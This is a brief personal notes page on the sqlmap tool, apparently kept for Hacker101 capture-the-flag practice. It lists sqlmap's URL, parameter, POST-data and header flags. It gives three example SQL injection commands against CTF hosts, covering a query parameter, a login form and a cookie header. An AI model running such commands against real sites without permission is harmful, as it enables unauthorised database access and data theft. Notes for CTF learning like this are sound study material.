---
{"dg-publish":true,"permalink":"/itsi/tools/sqlmap/","title":"sqlmap","tags":["tool","sqlmap","sql-injection","recon"]}
---

# sqlmap

[Official Link](https://sqlmap.org/)
## Flags
`-u`: Link
`-p`: Parameter to inject
`--data`: POST-Data
`-H`: Custom Header
## Examples
Example simple usage:
```bash
sqlmap -u 'https://b568377dcaff59ed0d9f2b94bd1950a5.ctf.hacker101.com/index.php?id=1' -p id
```

Example usage with POST-Data
```bash
sqlmap -u 'https://ae4fe95caf2e201f548292c49ae8690e.ctf.hacker101.com/login' --data 'username=1&password=1'
```

Example usage with cookie:
```bash
sqlmap -u 'https://b568377dcaff59ed0d9f2b94bd1950a5.ctf.hacker101.com/index.php?page=profile.php&id=d' -p id -H 'Cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3'
```